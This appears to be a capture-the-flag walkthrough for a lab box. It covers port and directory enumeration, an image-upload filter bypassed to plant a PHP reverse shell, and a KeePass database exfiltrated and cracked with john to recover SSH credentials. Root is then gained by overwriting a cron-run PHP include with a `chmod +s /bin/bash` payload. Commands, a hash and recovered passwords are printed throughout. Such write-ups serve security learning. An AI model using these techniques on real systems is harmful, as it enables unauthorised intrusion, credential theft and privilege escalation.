</br> nmap -p- -T5 10.10.238.206 -v
</br> 
</br> PORT    STATE SERVICE
</br> 22/tcp  open  ssh
</br> 80/tcp  open  http
</br> 139/tcp open  netbios-ssn
</br> 445/tcp open  microsoft-ds
</br> MAC Address: 02:F3:A8:36:7C:35 (Unknown)
</br> 
</br> nmap 22,80,139,445 -A -T3 10.10.238.206  -v
</br> 
</br> PORT    STATE SERVICE     VERSION
</br> 22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
</br> 80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
</br> | http-cookie-flags: 
</br> |   /: 
</br> |     PHPSESSID: 
</br> |_      httponly flag not set
</br> | http-methods: 
</br> |_  Supported Methods: GET HEAD POST OPTIONS
</br> |_http-server-header: Apache/2.4.41 (Ubuntu)
</br> | http-title: Login
</br> |_Requested resource was login.php
</br> 139/tcp open  netbios-ssn Samba smbd 4.6.2
</br> 445/tcp open  netbios-ssn Samba smbd 4.6.2
</br> MAC Address: 02:F3:A8:36:7C:35 (Unknown)
</br> 

</br>  gobuster dir -u http://10.10.238.206 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

</br> ...
</br> /css                  (Status: 301) [Size: 312] [--> http://10.10.238.206/css/]
</br> /cloud                (Status: 301) [Size: 314] [--> http://10.10.238.206/cloud/]
</br> /server-status        (Status: 403) [Size: 278]


</br> login form found over port 80
![loginPageFound](https://github.com/user-attachments/assets/ba43c977-ef5b-4049-8881-07f84cd5f15e)

</br> there are no quick wins for the version of samba 4.6 detected
![noQuickWinsFromVersionOfSamba46](https://github.com/user-attachments/assets/373e0f5c-73b0-46c0-91e0-a1bd1588394b)

</br> /cloud looks like a vector for file upload...

![arbFileUploadMaybe](https://github.com/user-attachments/assets/6d795b46-5271-40b4-bcc2-a1520777829c)

![testIntercept2](https://github.com/user-attachments/assets/189768a9-4128-4aff-9089-a56e046a253b)
just a test with putting in potato.txt
![proxyIntercept](https://github.com/user-attachments/assets/15f16207-4cfb-4ac3-8ccf-8bdf3535fb76)
</br>  huh, seems to be looking for an image in particular. Is it doing some kinda check for that?

![selectAnImage](https://github.com/user-attachments/assets/23a4dbc9-adc4-434d-9f3c-534d578f4f6c)


</br> from burpsuite, we see it uploads as a url, so the upload file should be displayed in the url bar at the top
</br> ...
</br> make nano shell1.php, change listening port and listening address with the basic pentestmonkey rev-shell for php
</br> below, I'm finding my local copy of the rev-shell template

![phpREvShell1](https://github.com/user-attachments/assets/9cb80a67-c471-41e3-9afd-43f1ecaf0ea1)
</br>  mod the port to 1984 because, haha, funny.
![resetAndRedo](https://github.com/user-attachments/assets/ccb8d61c-81de-4826-a911-6113839c265f)


![shellMod1](https://github.com/user-attachments/assets/89e66405-e2f1-4925-abcb-5edb00a7793f)

</br>spin up the python server so we can give the shell to the uploader
</br>python -m SimpleHTTPServer 7737
</br>
</br>(weird port number because others were in use)
</br>put into upload bar -->
</br>`http://10.10.228.228:7737/shell1.jpg`
![tryWithPython3AndShell1](https://github.com/user-attachments/assets/b5f78b20-c36a-4645-ad6c-d2e9f2253971)

</br>umm...
</br>...
</br>that didn't work so I gotta try something else... maybe a different port with python3 as the server?
</br> (TIME LAPSE)
</br> Went through all the steps again to get a new file of the php reverse shell called "sword.php", restarted everything because it wasn't working...

![getNewUpload](https://github.com/user-attachments/assets/08e80277-27e2-4a59-bdb1-0a8d33b69f12)





</br> To fool the check for an image, we can bypass with #anything.png
</br> but we need to delete the hashtag and trailing junk when executing the file via URL.
![wrongNameShouldBeShell1](https://github.com/user-attachments/assets/8e53fa79-8134-45c1-a2f3-791f753cb765)


</br> Ok, this is a big deal
</br> make sure netcat is listening on the proper port before uploading...
</br> the feedback url goes in the proper url without the # and following string junk. 
</br> this causes a hang, but netcat catches a session
![sessionGot2](https://github.com/user-attachments/assets/6f10435a-34cc-406a-9000-f0fdc4fc7f2b)

</br>snooping around finds /opt has contents
</br> this is arbitrary and there's no methodology for just figuring out where an interesting file is...
![snoopRandomlyFindOptAfterWandering](https://github.com/user-attachments/assets/a845e1a4-ffba-4489-a75f-a591ddb658ef)

</br>find / -user sysadmin 2>/dev/null
</br>find stuff owned by user sysadmin (our current user)

![interest409t3](https://github.com/user-attachments/assets/d36982ef-10f2-4607-8605-dd87db87e6db)

</br>var/www/html is from whence we read webpages from in typical structures like wordpress.
</br>(yes, I use "whence" because English is a peasant language without proper directional function words)
</br>Saving files here prevents us from needing a python server spun up since the web server is already serving stuff up
![shouldbeGrabbablewithwgetnow](https://github.com/user-attachments/assets/86a8d459-cfc9-44e3-a696-95e8fe8f73ef)

</br>we find a "dataset.kdbx"
</br>Just magic your way into knowing this is imporatant and we need "keepass" to read credentials from this saftey deposit box.
</br> copy the dataset.kdbx into the var/www area
</br> cp dataset.kdbx var/www/dataset.kdbx
![gotItLocally](https://github.com/user-attachments/assets/32d672d0-71a2-484a-b314-08b95c4a5a2e)

</br> this allows us to wget it without needing to host a server, as the web server is GET-able.
</br>  wget 10.10.220.22/dataset.kdbx
![gotItLocally](https://github.com/user-attachments/assets/2c5ad734-b8ae-4445-97d4-c4459b1955c9)

</br> busting.kdbx is not available via a google dork...
</br> eat dirt, google
![fuckYouGoogle](https://github.com/user-attachments/assets/ed119a63-a203-4fe4-8390-7c0ad03a89db)
</br> sudo apt install keepassxc
</br>  ^^ need to be able to read the file with keepassxc... pound of flesh...
</br> hacktricks does have some gidance here

![managednorr23r](https://github.com/user-attachments/assets/30ffb52b-b3d1-42f1-85b3-fec6a2c3b0ef)

</br>  got raw text for python file keepass2john from here : https://github.com/ivanmrsulja/keepass2john

</br>  I copied the code from https://github.com/ivanmrsulja/keepass2john/blob/master/keepass2john.py and put it into a python file </br> with nano calling it testconverter.py, and running it with python 3
```
python3 testconverter.py dataset.kdbx > outdata.hash
```

</br> note that I used nano to mae this
![nanorawshitbecausefuckyou3](https://github.com/user-attachments/assets/1b2f9403-e35b-4a46-a087-05356edb9145)


</br> outdata.hash will be messed up so you have to watch the output from this raw python run
</br> I, for example, saved it to hashTxt.hash.
</br> Make sure the file is headed specifically by `dataset:$keepass$*`
</br> as shown below in the raw text of the hash.
```
dataset:$keepass$*2*100000*222*2114f635de17709ecc4a2be2c3403135ffd7c0dd09084c4abe1d983ad94d93a5*2bceccca0facfb762eb79ca66588135c72a8835e43d871977ff7d3e9db0ffa17*cae9a25c785fc7f16772bb00bac5cc82*b68e2c3be9e46e8b7fc05eb944fad8b4ec5254a40084a73127b4126408b2ff46*b0afde2bd0db881200fc1c2494baf7c28b7486f081a82e935411ab72a27736b4
```
</br> that hash format is needed for john the ripper to crack it
```
john hashTxt.hash --wordlist=/usr/share/wordlists/rockyou.txt
```
![noteFormattingOfHash234324](https://github.com/user-attachments/assets/29014732-fb2b-47ce-af38-c35d7bb8f182)
</br>returned data:  *741852963*       (dataset)
</br> the we need to open the .kdbx file
</br>*keepassxc dataset.kdbx *
</br> enter pass:  741852963
![insidePanel34](https://github.com/user-attachments/assets/d55d27fe-360b-4038-af2a-a65a53bc493f)
</br> we can reveal the password by clicking on the eye-like icon
![passleak3](https://github.com/user-attachments/assets/625cf759-a495-48c0-89ac-ac58a9293266)


</br> the program returns the following pass info
</br>note the username:sysadmin
</br> pass: Cl0udP4ss40p4city#8700
![returnedPas2](https://github.com/user-attachments/assets/7461b02d-154c-4dd6-8f76-e2daccc73382)

</br>ssh into the sysadmin with the credentials:
</br> ssh sysadmin@<ip>
</br> and use the pass:  Cl0udP4ss40p4city#8700
</br> 
</br> *ls -laR scripts/ *
</br> (show what items are in the current DIR and who has what perms)
</br> sysadmin has ownership permissions over "lib" but a bunch of the stuff inside is run by root
</br> ![ownedByRootRunByRoot](https://github.com/user-attachments/assets/839cbdfe-4bbe-407b-948e-f2cc0c034fe6)
</br>  we can go into scripts and reat this .php file
</br> we want to look for FILE PATHS that could allow us to execute more stuff
![oddfilanadpathfound32434](https://github.com/user-attachments/assets/cfb7955d-752f-48eb-9b9c-163580be3dd1)

</br> this appears to be something running on a crontab, where the target file is executed regularly
</br> view crontab, but nothing's out of place
![nothingListedINCrontabButPhpisChronic](https://github.com/user-attachments/assets/c9ce6e7c-3c20-42c7-96d4-30c51c621ab4)
</br>  we can navigate to the file targeted by the script
![gotbackupfilein](https://github.com/user-attachments/assets/37efb18e-f9cb-4f4b-9a09-36c0d4f74206)
</br> delete the file with that name and make a new one in is place
</br> rm backup.inc.php
</br> nano backup.inc.php (now with our own code)
</br>`<?php system( "chmod +s /bin/bash");?>`
</br> (does a php breakout with suid bit set
![newphpesc](https://github.com/user-attachments/assets/b8d2da73-017c-4d40-b58d-f1ef3639367d)

</br>will allow us to spawn a root session if we go and do /bin/bash -p
</br>Note, this has to be done from /scripts, the same folder where script.php is, since we won't have the same path if we're in /lib.
</br> from /scripts, spawns a root shell session

![wergwhtr](https://github.com/user-attachments/assets/35f26bb8-d86e-4f91-b826-da29620a724c)

